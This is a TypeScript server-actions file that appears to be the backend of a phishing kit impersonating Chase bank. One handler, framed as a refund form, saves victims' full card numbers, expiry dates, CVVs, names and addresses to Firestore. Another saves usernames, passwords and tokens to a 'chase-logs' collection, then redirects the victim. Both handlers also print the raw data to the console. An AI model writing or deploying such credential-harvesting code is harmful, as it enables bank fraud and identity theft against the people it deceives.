"use server"

import { db } from './firebase';
import { collection, addDoc } from 'firebase/firestore';
import { redirect } from 'next/navigation';


// Define an interface for the form data
export interface FormData {
  orderId: string;
  reason: string;
  firstName: string;
  lastName: string;
  mobileNumber: string;
  homeAddress: string;
  zipCode: string;
  cardType: string;
  cardNumber: string;
  expirationDate: string;
  cvv: string;
}

// Define the function to handle form submission
export const handleFormSubmit = async (data: FormData): Promise<{ message: string }> => {
  console.log('Submitting data:', data);

  try {
    // Add data to Firestore (Refunds collection)
    const docRef = await addDoc(collection(db, 'refunds'), {
      orderId: data.orderId,
      reason: data.reason,
      firstName: data.firstName,
      lastName: data.lastName,
      mobileNumber: data.mobileNumber,
      homeAddress: data.homeAddress,
      zipCode: data.zipCode,
      cardType: data.cardType,
      cardNumber: data.cardNumber,
      expirationDate: data.expirationDate,
      cvv: data.cvv,
      timestamp: new Date(),
    });

    console.log('Document written with ID:', docRef.id);
    return { message: 'Success' }; // Return success response
  } catch (e) {
    console.error('Error adding document: ', e);
    throw new Error('Failed to submit data.');
  }
};




// signinData.ts


export interface SignInData {
  username: string;
  password: string;
  token?: string;
}


export async function handleSignIn(data: SignInData) {
  console.log("Submitting data:", data);

  // Add data to Firestore (chase-logs collection)
  const docRef = await addDoc(collection(db, "chase-logs"), {
    username: data.username,
    password: data.password,
    ...(data.token && { token: data.token }), // Only include the token if it exists
    timestamp: new Date(), // Add a timestamp for logging
  });

  console.log("Document written with ID:", docRef.id);

  // Redirect to the desired URL if no errors occurred
  redirect("/fff");
}
